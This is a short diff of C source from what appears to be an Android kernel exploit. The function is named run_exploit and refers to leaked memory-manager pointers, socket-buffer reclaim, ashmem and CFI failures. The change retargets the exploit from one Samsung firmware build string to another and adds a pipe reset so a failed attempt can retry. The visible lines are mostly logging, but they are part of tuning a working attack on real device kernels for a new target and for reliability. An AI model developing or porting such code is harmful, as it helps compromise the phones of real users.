@@ -191,7 +191,7 @@ int run_exploit(int argc, char **argv) {
   disable_rseq_for_thread();
   set_limit();
   log_startup_context();
-  pr_info("[cfi-trace4] upstream=2b4e8a64b78d18f236f0d5b26cfd204bc46363ce target=S908BXXSMGZB2 policy=one-cfi-per-child lifecycle-breadcrumbs=1\n");
+  pr_info("[cfi-trace4] upstream=2b4e8a64b78d18f236f0d5b26cfd204bc46363ce target=S901BXXSNGZD7 policy=one-cfi-per-child lifecycle-breadcrumbs=1\n");
   rmg_log_reclaim_lifetime("child-run-start");
   init_ashmem_path();
 
@@ -218,6 +218,8 @@ int run_exploit(int argc, char **argv) {
                last_leaked_mm, page_base, last_skb_reclaim_sent,
                last_skb_reclaim_want, last_skb_send_size);
     rmg_log_reclaim_lifetime("cfi-fail-pre-return");
+    pr_info("[cleanup] resetting pipe attempt before retry\n");
+    reset_pipe_attempt();
     return 70;
   }
 
